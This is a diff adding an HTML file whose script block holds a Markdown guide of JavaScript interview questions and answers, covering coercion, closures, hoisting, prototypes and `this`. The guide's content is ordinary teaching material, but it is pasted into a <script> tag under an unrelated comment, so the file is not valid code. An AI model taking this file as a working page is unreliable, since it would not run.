@@ -1,0 +1,4951 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <!--Combine debounce + API-->
+    <script>
+       # 100+ JavaScript Interview Questions & In-Depth Answers
+### For Frontend Developer Interviews — Indian IT Companies
+> Covers: TCS, Infosys, Wipro, HCL, Cognizant, Capgemini, Flipkart, Swiggy, Zomato, Razorpay, PhonePe, Paytm, Juspay, Freshworks, Zoho, Meesho, CRED
+
+---
+
+## 📚 TABLE OF CONTENTS
+
+1. [Data Types & Type Coercion](#1-data-types--type-coercion) — Q1–Q10
+2. [Scope, Hoisting & Closures](#2-scope-hoisting--closures) — Q11–Q22
+3. [Prototypes, OOP & `this`](#3-prototypes-oop--this) — Q23–Q33
+4. [Async JavaScript & Event Loop](#4-async-javascript--event-loop) — Q34–Q50
+5. [Array & Object Methods / Polyfills](#5-array--object-methods--polyfills) — Q51–Q65
+6. [Functional Programming](#6-functional-programming) — Q66–Q75
+7. [DOM, Events & Browser APIs](#7-dom-events--browser-apis) — Q76–Q84
+8. [ES6+ Modern JavaScript](#8-es6-modern-javascript) — Q85–Q93
+9. [Design Patterns](#9-design-patterns) — Q94–Q100
+10. [Performance, Security & Miscellaneous](#10-performance-security--miscellaneous) — Q101–Q110
+
+---
+
+---
+
+# 1. Data Types & Type Coercion
+
+---
+
+## Q1. What are the primitive and non-primitive data types in JavaScript?
+
+**Answer:**
+
+JavaScript has **8 data types** in total. Seven of them are **primitives** — meaning they are immutable and stored directly on the stack by value. The eighth is **Object**, which is non-primitive and stored by reference on the heap.
+
+**Primitives:**
+- `String` — textual data, e.g. `"hello"`
+- `Number` — integers and floats, e.g. `42`, `3.14`
+- `BigInt` — for very large integers, e.g. `9007199254740991n`
+- `Boolean` — `true` or `false`
+- `undefined` — a variable declared but not assigned
+- `null` — intentional absence of value
+- `Symbol` — unique identifiers, e.g. `Symbol('id')`
+
+**Non-Primitive:**
+- `Object` — includes plain objects `{}`, arrays `[]`, functions, dates, etc.
+
+**Key distinction — value vs reference:**
+
+```js
+// Primitives — copied by value
+let a = 10;
+let b = a;
+b = 20;
+console.log(a); // 10 — a is unaffected
+
+// Objects — copied by reference
+let obj1 = { name: "Ravi" };
+let obj2 = obj1;
+obj2.name = "Priya";
+console.log(obj1.name); // "Priya" — obj1 is affected!
+```
+
+This distinction is critical for interviews. When you copy a primitive, you get an independent copy. When you copy an object, both variables point to the **same memory location**.
+
+---
+
+## Q2. What is the difference between `==` (loose equality) and `===` (strict equality)?
+
+**Answer:**
+
+`==` performs **type coercion** before comparing. That means JavaScript tries to convert both values to the same type before checking equality. `===` does **no coercion** — it checks both value AND type.
+
+```js
+console.log(0 == false);   // true  — false is coerced to 0
+console.log(0 === false);  // false — different types
+
+console.log("" == false);  // true  — both coerced to 0
+console.log("" === false); // false
+
+console.log(null == undefined);  // true  — special JS rule
+console.log(null === undefined); // false
+
+console.log(1 == "1");  // true  — "1" coerced to 1
+console.log(1 === "1"); // false
+```
+
+**The coercion rules for `==` follow the Abstract Equality Comparison algorithm:**
+- If types are the same, it behaves like `===`
+- `null == undefined` is always `true` (only these two are equal to each other)
+- If one is a number and other is a string, the string is converted to a number
+- If one is a boolean, it's converted to a number first
+
+**Best practice:** Always use `===` in production code to avoid unexpected bugs.
+
+---
+
+## Q3. What is `typeof` and what are its quirks?
+
+**Answer:**
+
+`typeof` is a unary operator that returns a string indicating the type of the operand.
+
+```js
+typeof "hello"      // "string"
+typeof 42           // "number"
+typeof true         // "boolean"
+typeof undefined    // "undefined"
+typeof Symbol()     // "symbol"
+typeof 42n          // "bigint"
+typeof {}           // "object"
+typeof []           // "object"  ← arrays are objects
+typeof null         // "object"  ← famous historical bug in JS
+typeof function(){} // "function" ← functions are special objects
+```
+
+**The two major gotchas:**
+
+1. `typeof null === "object"` — This is a **bug in JavaScript** dating back to its original implementation in 1995. It was never fixed to avoid breaking existing websites. To correctly check for null, use `value === null`.
+
+2. `typeof []` returns `"object"` too. To check if something is an array, use `Array.isArray(value)`.
+
+---
+
+## Q4. Explain `null` vs `undefined`. When do you use each?
+
+**Answer:**
+
+Both represent the absence of a value, but they convey different intentions:
+
+`undefined` means a variable has been **declared but not yet assigned** a value. JavaScript itself sets variables to `undefined` by default.
+
+`null` means you are **explicitly setting** a variable to "no value" or "empty". It's a developer's intentional signal.
+
+```js
+let name;
+console.log(name); // undefined — JS assigned this automatically
+
+let user = null;   // developer explicitly says "no user yet"
+console.log(user); // null
+```
+
+**Practical examples:**
+
+```js
+function getUser(id) {
+  // If user not found, return null — intentional empty
+  return null;
+}
+
+function greet(name) {
+  // If no name passed, JS gives undefined by default
+  console.log(name); // undefined
+}
+```
+
+**Equality check quirk:**
+```js
+null == undefined   // true  (loose equality — both mean "no value")
+null === undefined  // false (strict equality — different types)
+```
+
+---
+
+## Q5. What is type coercion? Explain with examples.
+
+**Answer:**
+
+Type coercion is JavaScript's automatic (implicit) conversion of values from one type to another when performing operations. It can be **implicit** (JS does it automatically) or **explicit** (you do it manually).
+
+**Implicit coercion — the tricky cases:**
+
+```js
+// String coercion with +
+"5" + 3       // "53"  — 3 is coerced to string
+"5" - 3       // 2     — "5" is coerced to number (only + triggers string concat)
+"5" * "2"     // 10    — both coerced to numbers
+
+// Boolean coercion in conditions
+if (0)   { }  // doesn't run — 0 is falsy
+if ("")  { }  // doesn't run — "" is falsy
+if ([])  { }  // RUNS — [] is truthy, even though [] == false is true!
+if ({})  { }  // RUNS — {} is truthy
+
+// Object to primitive
+[] + []   // ""       — both arrays convert to empty strings
+[] + {}   // "[object Object]"
+{} + []   // 0 or "[object Object]" depending on context
+```
+
+**Explicit coercion — always prefer this:**
+```js
+Number("42")    // 42
+String(42)      // "42"
+Boolean(0)      // false
+parseInt("3.5") // 3
+parseFloat("3.5") // 3.5
+```
+
+**Falsy values in JS (these coerce to `false`):**
+`0`, `""`, `null`, `undefined`, `NaN`, `false`
+
+Everything else — including `[]`, `{}`, `"0"` — is **truthy**.
+
+---
+
+## Q6. What is `NaN`? How do you correctly check for it?
+
+**Answer:**
+
+`NaN` stands for **Not a Number**. Despite its name, `typeof NaN === "number"`. It represents the result of an invalid or undefined mathematical operation.
+
+```js
+console.log(0 / 0);         // NaN
+console.log(parseInt("abc")); // NaN
+console.log(Math.sqrt(-1));   // NaN
+```
+
+**The biggest gotcha — `NaN` is the only value in JS that is not equal to itself:**
+
+```js
+console.log(NaN === NaN); // false  ← very unintuitive!
+console.log(NaN == NaN);  // false
+```
+
+**Correct ways to check for NaN:**
+
+```js
+// Method 1: Number.isNaN() — BEST, no type coercion
+Number.isNaN(NaN);       // true
+Number.isNaN("hello");   // false — "hello" is not NaN, it's a string
+Number.isNaN(undefined); // false
+
+// Method 2: global isNaN() — AVOID, does coercion
+isNaN("hello");   // true  — BAD! "hello" gets coerced to NaN first
+isNaN(undefined); // true  — BAD! misleading
+
+// Method 3: Use the self-inequality trick
+function isNaNValue(val) {
+  return val !== val; // only NaN fails self-equality
+}
+```
+
+Always use `Number.isNaN()` instead of the global `isNaN()`.
+
+---
+
+## Q7. What is the difference between `null`, `undefined`, and undeclared variables?
+
+**Answer:**
+
+These three are fundamentally different and confuse many developers:
+
+```js
+// 1. Undeclared — variable never declared at all
+console.log(x); // ReferenceError: x is not defined
+typeof x;       // "undefined" — typeof is safe even for undeclared vars
+
+// 2. undefined — declared but not assigned
+let y;
+console.log(y); // undefined
+typeof y;       // "undefined"
+
+// 3. null — explicitly set to empty
+let z = null;
+console.log(z); // null
+typeof z;       // "object" (the famous bug)
+```
+
+**Important interview point:** `typeof` is the only operator that is safe to use on an undeclared variable without throwing an error. This is sometimes used for feature detection:
+
+```js
+if (typeof window !== 'undefined') {
+  // we're in a browser environment
+}
+```
+
+---
+
+## Q8. What is the difference between `Object.is()` and `===`?
+
+**Answer:**
+
+`Object.is()` behaves almost identically to `===`, with two important exceptions:
+
+```js
+// Exception 1: NaN comparison
+NaN === NaN;          // false
+Object.is(NaN, NaN);  // true ✅
+
+// Exception 2: Signed zero
++0 === -0;            // true
+Object.is(+0, -0);    // false ✅
+
+// Everything else is the same:
+Object.is(1, 1);      // true
+Object.is(null, null); // true
+Object.is("a", "a");  // true
+```
+
+`Object.is()` implements the **SameValue algorithm**, which is more mathematically precise. It's used internally by JavaScript in places like `Map` keys and `Set` values.
+
+---
+
+## Q9. Predict the output — Type Coercion Traps
+
+**Answer:**
+
+These are classic questions asked in Indian IT company interviews:
+
+```js
+console.log(1 + "2" + "3");  // "123" — 1 coerced to "1", then concatenation
+console.log(1 + +"2" + "3"); // "33"  — +"2" is unary +, converts to 2; 1+2=3; "3"+"3"="33"
+console.log("A" - "B" + "2"); // "NaN2" — NaN + "2" = "NaN2"
+console.log(+"");             // 0     — empty string coerces to 0
+console.log(+null);           // 0     — null coerces to 0
+console.log(+undefined);      // NaN
+console.log(+true);           // 1
+console.log(+false);          // 0
+console.log(+"3abc");         // NaN   — not a valid number
+console.log([] == ![]);       // true  — very tricky! [] is truthy, ![] is false (0), [] converts to 0
+```
+
+---
+
+## Q10. What are Symbols and when would you use them?
+
+**Answer:**
+
+`Symbol` is a primitive type introduced in ES6. Every Symbol is **guaranteed to be unique**, even if created with the same description. You create one using `Symbol("description")` — note that you don't use `new`.
+
+```js
+const id1 = Symbol("id");
+const id2 = Symbol("id");
+console.log(id1 === id2); // false — always unique!
+```
+
+**Primary use cases:**
+
+**1. Creating unique object keys to avoid name collisions (especially in libraries):**
+```js
+const USER_ID = Symbol("userId");
+const obj = {
+  [USER_ID]: 123,
+  name: "Ravi"
+};
+console.log(obj[USER_ID]); // 123
+// Symbol keys are hidden from for...in, Object.keys(), JSON.stringify()
+```
+
+**2. Well-known Symbols — customizing built-in JS behavior:**
+```js
+class MyArray {
+  [Symbol.iterator]() {
+    // define custom iteration behavior
+  }
+}
+```
+
+**Important:** Symbols are not enumerable in `for...in` loops and don't appear in `JSON.stringify()` — this makes them useful for "private-like" properties.
+
+---
+
+---
+
+# 2. Scope, Hoisting & Closures
+
+---
+
+## Q11. What is scope in JavaScript? Explain all types.
+
+**Answer:**
+
+Scope determines the **visibility and accessibility** of variables. JavaScript has four types of scope:
+
+**1. Global Scope** — variables declared outside any function or block are accessible everywhere.
+
+```js
+var globalVar = "I'm global";
+function show() {
+  console.log(globalVar); // accessible
+}
+```
+
+**2. Function Scope** — variables declared with `var` inside a function are only accessible within that function.
+
+```js
+function greet() {
+  var message = "Hello";
+}
+console.log(message); // ReferenceError — not accessible outside
+```
+
+**3. Block Scope** — variables declared with `let` or `const` inside `{}` are only accessible within that block.
+
+```js
+{
+  let blockVar = "I'm block scoped";
+  const blockConst = "Me too";
+}
+console.log(blockVar); // ReferenceError
+```
+
+**4. Module Scope** — variables in ES modules are scoped to the module file and not globally accessible unless exported.
+
+**Scope Chain:** When a variable is referenced, JS looks in the current scope first, then moves up to parent scopes until it reaches global scope. If not found, a `ReferenceError` is thrown.
+
+```js
+let x = "global";
+function outer() {
+  let y = "outer";
+  function inner() {
+    let z = "inner";
+    console.log(x, y, z); // all accessible — via scope chain
+  }
+  inner();
+  // console.log(z); // ReferenceError — z is not in this scope
+}
+```
+
+---
+
+## Q12. Explain Hoisting in JavaScript in depth.
+
+**Answer:**
+
+Hoisting is JavaScript's behavior of **moving declarations to the top of their scope** during the compilation phase (before code executes). Only **declarations** are hoisted, not **initializations**.
+
+**`var` hoisting:**
+```js
+console.log(name); // undefined — not ReferenceError!
+var name = "Ravi";
+// JS internally treats this as:
+// var name; (hoisted to top)
+// console.log(name); — undefined
+// name = "Ravi";
+```
+
+**`let` and `const` — hoisted BUT in Temporal Dead Zone (TDZ):**
+```js
+console.log(age); // ReferenceError: Cannot access 'age' before initialization
+let age = 25;
+```
+
+`let` and `const` are technically hoisted (the JS engine knows about them), but they are in the **Temporal Dead Zone (TDZ)** from the start of the block until their declaration line. Accessing them during TDZ throws a `ReferenceError`.
+
+**Function Declaration hoisting — fully hoisted:**
+```js
+greet(); // "Hello!" — works fine!
+function greet() {
+  console.log("Hello!");
+}
+```
+
+**Function Expression hoisting — only the variable is hoisted:**
+```js
+sayHi(); // TypeError: sayHi is not a function
+var sayHi = function() {
+  console.log("Hi!");
+};
+// var sayHi is hoisted (as undefined), but the function is not
+```
+
+**Class declarations — also in TDZ:**
+```js
+const obj = new MyClass(); // ReferenceError
+class MyClass {}
+```
+
+---
+
+## Q13. What is the Temporal Dead Zone (TDZ)?
+
+**Answer:**
+
+The TDZ is the period between the **start of a block** and the point where a `let` or `const` variable is actually initialized. During this zone, the variable exists in scope but cannot be accessed.
+
+```js
+{
+  // ← TDZ for 'color' starts here
+  console.log(color); // ReferenceError: Cannot access 'color' before initialization
+  let color = "blue"; // ← TDZ ends here
+  console.log(color); // "blue"
+}
+```
+
+**Why does TDZ exist?** It was intentionally designed to catch bugs. With `var`, you could accidentally read a variable before assigning it and get `undefined` silently. TDZ makes this a loud error so you can fix it.
+
+**TDZ with function parameters:**
+```js
+// Default parameter values can also hit TDZ:
+function fn(a = b, b = 2) {} // ReferenceError: b is used before declaration
+fn();
+```
+
+---
+
+## Q14. What is a Closure? Explain with real-world examples.
+
+**Answer:**
+
+A closure is a function that **remembers and has access to its outer scope's variables even after the outer function has returned**. Closures are created every time a function is created in JavaScript.
+
+**Simple example:**
+```js
+function outer() {
+  let count = 0; // this variable is "closed over"
+
+  return function inner() {
+    count++;
+    console.log(count);
+  };
+}
+
+const counter = outer(); // outer() runs and returns inner
+counter(); // 1
+counter(); // 2
+counter(); // 3
+// count persists across calls because inner closes over it
+```
+
+**Real-world use case 1 — Private state / encapsulation:**
+```js
+function createBankAccount(initialBalance) {
+  let balance = initialBalance; // private — cannot be directly accessed
+
+  return {
+    deposit(amount) { balance += amount; },
+    withdraw(amount) {
+      if (amount > balance) return "Insufficient funds";
+      balance -= amount;
+    },
+    getBalance() { return balance; }
+  };
+}
+
+const account = createBankAccount(1000);
+account.deposit(500);
+console.log(account.getBalance()); // 1500
+console.log(balance); // ReferenceError — truly private!
+```
+
+**Real-world use case 2 — Function factories:**
+```js
+function multiplier(factor) {
+  return function(number) {
+    return number * factor; // closes over factor
+  };
+}
+
+const double = multiplier(2);
+const triple = multiplier(3);
+
+double(5); // 10
+triple(5); // 15
+```
+
+**Real-world use case 3 — Module pattern:**
+```js
+const userModule = (function() {
+  let users = []; // private
+
+  return {
+    addUser(name) { users.push(name); },
+    getUsers() { return [...users]; }
+  };
+})();
+```
+
+---
+
+## Q15. Classic Closure Bug with `var` in loops — explain and fix it.
+
+**Answer:**
+
+This is one of the most famous interview questions in JavaScript. Consider:
+
+```js
+for (var i = 0; i < 3; i++) {
+  setTimeout(function() {
+    console.log(i); // prints 3, 3, 3 — NOT 0, 1, 2!
+  }, 1000);
+}
+```
+
+**Why does this happen?** Because `var` is function-scoped, not block-scoped. There is only **one shared `i` variable** for the entire loop. By the time the `setTimeout` callbacks run (after 1 second), the loop has already finished and `i` is `3`. All three callbacks reference the same `i`.
+
+**Fix 1 — Use `let` (block scoping creates a new `i` per iteration):**
+```js
+for (let i = 0; i < 3; i++) {
+  setTimeout(function() {
+    console.log(i); // 0, 1, 2 ✅
+  }, 1000);
+}
+// Each iteration gets its own block-scoped copy of i
+```
+
+**Fix 2 — IIFE (Immediately Invoked Function Expression) to capture `i`:**
+```js
+for (var i = 0; i < 3; i++) {
+  (function(j) { // j is a new variable for each iteration
+    setTimeout(function() {
+      console.log(j); // 0, 1, 2 ✅
+    }, 1000);
+  })(i); // immediately invoke with current value of i
+}
+```
+
+**Fix 3 — `bind` to pass current value:**
+```js
+for (var i = 0; i < 3; i++) {
+  setTimeout(console.log.bind(null, i), 1000); // 0, 1, 2 ✅
+}
+```
+
+---
+
+## Q16. What is the difference between `var`, `let`, and `const`?
+
+**Answer:**
+
+| Feature | `var` | `let` | `const` |
+|---|---|---|---|
+| Scope | Function | Block | Block |
+| Hoisting | Yes (undefined) | Yes (TDZ) | Yes (TDZ) |
+| Re-declaration | Yes | No | No |
+| Re-assignment | Yes | Yes | No |
+| Global property | Yes (`window.x`) | No | No |
+
+```js
+// var — function scoped, hoisted, re-declarable
+var x = 1;
+var x = 2; // OK — no error
+
+// let — block scoped, TDZ, no re-declaration
+let y = 1;
+let y = 2; // SyntaxError: already been declared
+y = 3;     // OK — re-assignment is fine
+
+// const — block scoped, TDZ, no re-assignment
+const z = 1;
+z = 2; // TypeError: Assignment to constant variable
+```
+
+**Important — `const` with objects/arrays:**
+```js
+const user = { name: "Ravi" };
+user.name = "Priya"; // ALLOWED — modifying the object's content
+user = { name: "Priya" }; // TypeError — can't reassign the binding
+
+const arr = [1, 2, 3];
+arr.push(4); // ALLOWED — mutating the array
+arr = [5, 6]; // TypeError
+```
+
+`const` prevents **re-assignment of the variable binding**, not mutation of the value itself. To make an object truly immutable, use `Object.freeze()`.
+
+---
+
+## Q17. What is a Lexical Environment?
+
+**Answer:**
+
+A Lexical Environment is the internal JavaScript structure that maps **variable names to their values** in a given scope. Every time a function runs, a new Lexical Environment is created for it. Each Lexical Environment also has a reference to its **outer (parent) Lexical Environment**, forming the scope chain.
+
+```js
+let globalVar = "global"; // Lexical Environment: Global { globalVar: "global" }
+
+function outer() {
+  let outerVar = "outer"; // Lexical Environment: outer { outerVar: "outer", outer: ref to Global }
+
+  function inner() {
+    let innerVar = "inner"; // Lexical Environment: inner { innerVar: "inner", outer: ref to outer }
+    console.log(globalVar); // found via scope chain: inner → outer → global
+    console.log(outerVar);  // found in outer LE
+  }
+  inner();
+}
+```
+
+Closures are essentially functions that carry a reference to the Lexical Environment in which they were created — this is how they "remember" variables even after the outer function has returned.
+
+---
+
+## Q18. What is an IIFE (Immediately Invoked Function Expression)? Why use it?
+
+**Answer:**
+
+An IIFE is a function that is **defined and immediately called** in the same expression. It creates a private scope to avoid polluting the global namespace.
+
+```js
+// Syntax:
+(function() {
+  var privateVar = "I'm private";
+  console.log("IIFE runs immediately!");
+})();
+
+// With arrow function:
+(() => {
+  console.log("Arrow IIFE!");
+})();
+
+// With parameters:
+(function(name) {
+  console.log("Hello", name);
+})("Ravi");
+```
+
+**Why use an IIFE?**
+
+Before ES6 modules, IIFEs were the primary way to:
+1. **Create private scope** — variables inside the IIFE don't leak to global scope
+2. **Module pattern** — expose only what you want
+3. **Avoid variable name conflicts** in large codebases or when combining JS files
+
+```js
+// Classic module pattern using IIFE:
+const ShoppingCart = (function() {
+  const items = []; // truly private
+
+  return {
+    add(item) { items.push(item); },
+    getTotal() { return items.reduce((sum, i) => sum + i.price, 0); }
+  };
+})();
+```
+
+Today, ES Modules (`import`/`export`) have largely replaced IIFEs, but they still appear in interviews.
+
+---
+
+## Q19. What is the scope chain and how does variable lookup work?
+
+**Answer:**
+
+When JavaScript looks up a variable, it starts in the **current scope**. If not found, it moves to the **parent scope**, then the parent's parent, all the way up to the **global scope**. This chain of scopes is called the **scope chain**.
+
+```js
+const a = "global a";
+
+function outer() {
+  const b = "outer b";
+
+  function middle() {
+    const c = "middle c";
+
+    function inner() {
+      const d = "inner d";
+      // Lookup order: inner → middle → outer → global
+      console.log(d); // found in inner
+      console.log(c); // found in middle
+      console.log(b); // found in outer
+      console.log(a); // found in global
+      // console.log(e); // ReferenceError — not in any scope
+    }
+    inner();
+  }
+  middle();
+}
+outer();
+```
+
+The scope chain is determined **lexically** (at write time), not dynamically (at call time). It doesn't matter where a function is called from — what matters is where it was **defined**. This is called **lexical scoping**.
+
+---
+
+## Q20. What is the difference between lexical scope and dynamic scope?
+
+**Answer:**
+
+**Lexical scope (JavaScript uses this):** The scope of a variable is determined by **where it is written** in the source code. A function's scope is determined at the time it's defined.
+
+```js
+let name = "Global";
+
+function printName() {
+  console.log(name); // always looks at where printName was DEFINED
+}
+
+function run() {
+  let name = "Local"; // this does NOT affect printName
+  printName(); // "Global" — because printName was defined in global scope
+}
+run();
+```
+
+**Dynamic scope (not JS — just for comparison):** The scope would be determined by where the function is **called** from. In a dynamic scope language, `printName()` above would print `"Local"`.
+
+JavaScript is **lexically scoped**, with one exception: `this` keyword is **dynamically bound** based on how a function is called (not where it's defined), which is why `this` can be confusing.
+
+---
+
+## Q21. What is a closure leak / memory leak with closures? How to prevent it?
+
+**Answer:**
+
+A closure leak occurs when a closure holds a reference to a large object or DOM element that is no longer needed, preventing the garbage collector from freeing that memory.
+
+```js
+// ❌ Memory leak example:
+function attachHandler() {
+  const largeData = new Array(1000000).fill("data"); // huge array
+
+  document.getElementById("btn").addEventListener("click", function() {
+    // This closure keeps largeData alive even if we don't use it here!
+    console.log("clicked");
+  });
+}
+attachHandler();
+// largeData can never be garbage collected as long as the event listener exists
+```
+
+**How to prevent:**
+
+```js
+// ✅ Fix: Don't capture what you don't need
+function attachHandler() {
+  const smallData = "just what I need";
+
+  const handler = function() {
+    console.log(smallData);
+  };
+
+  document.getElementById("btn").addEventListener("click", handler);
+
+  // Clean up when done:
+  return function cleanup() {
+    document.getElementById("btn").removeEventListener("click", handler);
+  };
+}
+
+const cleanup = attachHandler();
+// Call cleanup() when the component/section is unmounted
+cleanup();
+```
+
+In React, this is why you should always clean up event listeners, intervals, and subscriptions in the `useEffect` cleanup function.
+
+---
+
+## Q22. Predict the output — Closures & Hoisting Combined
+
+**Answer:**
+
+```js
+function test() {
+  console.log(a); // ① undefined (var a is hoisted)
+  var a = 10;
+  console.log(a); // ② 10
+
+  function inner() {
+    console.log(a); // ③ 10 (closes over var a from test)
+  }
+  inner();
+}
+test();
+
+// -------
+
+var x = 1;
+function foo() {
+  var x = 2;
+  return function() {
+    return x; // closes over the x in foo
+  };
+}
+console.log(foo()()); // ④ 2 — not the global x!
+
+// -------
+
+let result = [];
+for (var i = 0; i < 3; i++) {
+  result[i] = function() { return i; };
+}
+console.log(result[0]()); // ⑤ 3
+console.log(result[1]()); // ⑤ 3
+console.log(result[2]()); // ⑤ 3
+// All share the same var i, which is 3 after loop ends
+```
+
+---
+
+---
+
+# 3. Prototypes, OOP & `this`
+
+---
+
+## Q23. What is the Prototype Chain in JavaScript?
+
+**Answer:**
+
+Every JavaScript object has an internal property called `[[Prototype]]` (accessible via `__proto__` or `Object.getPrototypeOf()`). When you access a property on an object, JS first looks at the object itself, then at its prototype, then at the prototype's prototype, all the way up to `null`. This chain is called the **prototype chain**.
+
+```js
+const animal = {
+  breathe() { console.log("breathing..."); }
+};
+
+const dog = Object.create(animal); // dog's prototype is animal
+dog.bark = function() { console.log("woof!"); };
+
+dog.bark();    // found directly on dog
+dog.breathe(); // not on dog → found on animal (via prototype chain)
+
+// The chain: dog → animal → Object.prototype → null
+
+console.log(dog.__proto__ === animal); // true
+console.log(animal.__proto__ === Object.prototype); // true
+console.log(Object.prototype.__proto__); // null — end of chain
+```
+
+**hasOwnProperty — checking own vs inherited:**
+```js
+console.log(dog.hasOwnProperty("bark"));    // true  — own property
+console.log(dog.hasOwnProperty("breathe")); // false — inherited
+```
+
+---
+
+## Q24. What is the difference between `__proto__` and `prototype`?
+
+**Answer:**
+
+This is one of the most confusing distinctions in JavaScript.
+
+`prototype` is a **property on constructor functions** (and classes). It's the object that becomes the `[[Prototype]]` of instances created with `new`.
+
+`__proto__` (or `Object.getPrototypeOf()`) is a **property on instances** that points to the constructor's `prototype`.
+
+```js
+function Person(name) {
+  this.name = name;
+}
+Person.prototype.greet = function() {
+  console.log("Hi, I'm " + this.name);
+};
+
+const ravi = new Person("Ravi");
+
+// The relationship:
+ravi.__proto__ === Person.prototype; // true ✅
+Person.prototype.constructor === Person; // true ✅
+
+ravi.greet(); // found via ravi.__proto__.greet — prototype chain lookup
+```
+
+**Visual chain:**
+```
+ravi (instance)
+  └── __proto__ → Person.prototype { greet: fn, constructor: Person }
+                       └── __proto__ → Object.prototype { hasOwnProperty: fn, ... }
+                                            └── __proto__ → null
+```
+
+---
+
+## Q25. How does `new` keyword work internally?
+
+**Answer:**
+
+When you call a function with `new`, JavaScript performs 4 steps automatically:
+
+1. Creates a new empty object `{}`
+2. Sets the new object's `[[Prototype]]` to the constructor's `prototype`
+3. Calls the constructor function with `this` bound to the new object
+4. Returns the new object (unless the constructor explicitly returns a different object)
+
+```js
+// What new does internally:
+function myNew(Constructor, ...args) {
+  // Step 1 & 2: create object with correct prototype
+  const obj = Object.create(Constructor.prototype);
+
+  // Step 3: call constructor with this = new object
+  const result = Constructor.apply(obj, args);
+
+  // Step 4: return the new object (or constructor's return value if it's an object)
+  return result instanceof Object ? result : obj;
+}
+
+// Usage:
+function Car(make, model) {
+  this.make = make;
+  this.model = model;
+}
+Car.prototype.describe = function() {
+  return `${this.make} ${this.model}`;
+};
+
+const car1 = new Car("Toyota", "Innova");
+const car2 = myNew(Car, "Honda", "City"); // same result
+
+car1.describe(); // "Toyota Innova"
+car2.describe(); // "Honda City"
+```
+
+---
+
+## Q26. Explain `this` in JavaScript — all binding rules.
+
+**Answer:**
+
+`this` is determined by **how a function is called**, not where it's defined. There are 5 binding rules, applied in order of priority:
+
+**Rule 1 — Default binding (lowest priority): `this` is `globalThis` (or `undefined` in strict mode)**
+```js
+function show() {
+  console.log(this); // window (browser) or global (Node)
+}
+show();
+
+// In strict mode:
+"use strict";
+function show() {
+  console.log(this); // undefined
+}
+```
+
+**Rule 2 — Implicit binding: `this` is the object before the dot**
+```js
+const user = {
+  name: "Ravi",
+  greet() {
+    console.log(this.name); // "Ravi" — this = user
+  }
+};
+user.greet();
+
+// Gotcha — losing implicit binding:
+const fn = user.greet;
+fn(); // undefined — this = global/undefined (no object before the dot!)
+```
+
+**Rule 3 — Explicit binding: `call`, `apply`, `bind`**
+```js
+function greet(greeting) {
+  console.log(`${greeting}, ${this.name}`);
+}
+const person = { name: "Priya" };
+
+greet.call(person, "Hello");    // "Hello, Priya"
+greet.apply(person, ["Hi"]);    // "Hi, Priya"
+const boundFn = greet.bind(person);
+boundFn("Hey");                 // "Hey, Priya"
+```
+
+**Rule 4 — `new` binding:**
+```js
+function Person(name) {
+  this.name = name; // this = the newly created object
+}
+const p = new Person("Kiran");
+console.log(p.name); // "Kiran"
+```
+
+**Rule 5 — Arrow functions (lexical `this` — highest predictability):**
+```js
+const obj = {
+  name: "Meera",
+  greet: function() {
+    const inner = () => {
+      console.log(this.name); // "Meera" — arrow inherits this from greet
+    };
+    inner();
+  }
+};
+obj.greet(); // "Meera" ✅
+
+// Arrow functions CANNOT be bound with call/apply/bind
+```
+
+---
+
+## Q27. What is the difference between `call`, `apply`, and `bind`?
+
+**Answer:**
+
+All three allow you to explicitly set `this` and pass arguments. The difference is in how and when the function is executed:
+
+```js
+function introduce(city, company) {
+  console.log(`I'm ${this.name} from ${city}, working at ${company}`);
+}
+
+const person = { name: "Arjun" };
+
+// call — invokes immediately, args passed individually
+introduce.call(person, "Bangalore", "Flipkart");
+// "I'm Arjun from Bangalore, working at Flipkart"
+
+// apply — invokes immediately, args passed as ARRAY
+introduce.apply(person, ["Mumbai", "Paytm"]);
+// "I'm Arjun from Mumbai, working at Paytm"
+
+// bind — returns a NEW function with 'this' bound, doesn't invoke immediately
+const boundFn = introduce.bind(person, "Hyderabad");
+boundFn("Swiggy"); // can add more args later
+// "I'm Arjun from Hyderabad, working at Swiggy"
+```
+
+**Memory trick:** `call` = comma-separated, `apply` = array
+
+**Implementing `call` from scratch:**
+```js
+Function.prototype.myCall = function(context, ...args) {
+  context = context || globalThis;
+  const uniqueKey = Symbol(); // avoid overwriting existing properties
+  context[uniqueKey] = this;  // temporarily attach function to context
+  const result = context[uniqueKey](...args);
+  delete context[uniqueKey];  // clean up
+  return result;
+};
+
+introduce.myCall(person, "Chennai", "Zoho");
+```
+
+---
+
+## Q28. What is Prototypal Inheritance and how does it differ from Classical Inheritance?
+
+**Answer:**
+
+**Classical Inheritance** (Java, C++) is based on classes as blueprints. Objects are instances of classes. Inheritance is class-to-class — a child class extends a parent class.
+
+**Prototypal Inheritance** (JavaScript) is based on objects directly inheriting from other objects. There's no class blueprint — just a chain of objects. (ES6 `class` syntax is just syntactic sugar over prototypes.)
+
+```js
+// Prototypal inheritance with Object.create:
+const vehicle = {
+  move() { console.log(`${this.type} is moving`); }
+};
+
+const car = Object.create(vehicle); // car's prototype IS vehicle
+car.type = "Car";
+car.honk = function() { console.log("Beep!"); };
+
+car.move(); // "Car is moving" — inherited from vehicle
+car.honk(); // "Beep!"
+
+// ES6 class (syntactic sugar — same thing under the hood):
+class Vehicle {
+  move() { console.log(`${this.type} is moving`); }
+}
+
+class Car extends Vehicle {
+  constructor() {
+    super();
+    this.type = "Car";
+  }
+  honk() { console.log("Beep!"); }
+}
+```
+
+**Key difference:** In classical inheritance, the child class gets a **copy** of the parent's behavior. In prototypal inheritance, the child object **delegates** to the parent object via the prototype chain — it doesn't copy.
+
+---
+
+## Q29. What is the difference between `Object.create()`, constructor functions, and ES6 `class`?
+
+**Answer:**
+
+All three are ways to create objects with shared behavior, but they differ in style and flexibility:
+
+```js
+// 1. Object.create() — most explicit prototypal approach
+const personProto = {
+  greet() { console.log("Hi, I'm " + this.name); }
+};
+
+const ravi = Object.create(personProto);
+ravi.name = "Ravi";
+ravi.greet(); // "Hi, I'm Ravi"
+
+// 2. Constructor Function — pre-ES6 way
+function Person(name) {
+  this.name = name;
+}
+Person.prototype.greet = function() {
+  console.log("Hi, I'm " + this.name);
+};
+const priya = new Person("Priya");
+priya.greet();
+
+// 3. ES6 Class — clean syntax, same prototype mechanism
+class PersonClass {
+  constructor(name) {
+    this.name = name;
+  }
+  greet() {
+    console.log("Hi, I'm " + this.name);
+  }
+}
+const meera = new PersonClass("Meera");
+meera.greet();
+```
+
